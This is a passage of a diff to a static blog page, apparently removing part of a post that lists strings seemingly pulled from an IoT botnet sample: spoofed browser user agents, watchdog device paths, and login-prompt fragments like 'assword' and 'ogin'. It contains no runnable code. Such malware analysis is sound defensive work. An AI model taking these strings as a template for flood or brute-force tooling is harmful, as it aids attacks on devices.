(KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36</span><br><span class="line">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)</span><br><span class="line">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0</span><br><span class="line">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0</span><br><span class="line">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0</span><br><span class="line">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94</span><br><span class="line">/dev/watchdog</span><br><span class="line">/dev/misc/watchdog</span><br><span class="line">assword</span><br><span class="line">ogin</span><br><span class="line">enter</span><br><span class="line">dkaowjfirhiad1j3edjkai</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1315,7 +1280,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">56</span>
+          <span class="site-state-item-count">57</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
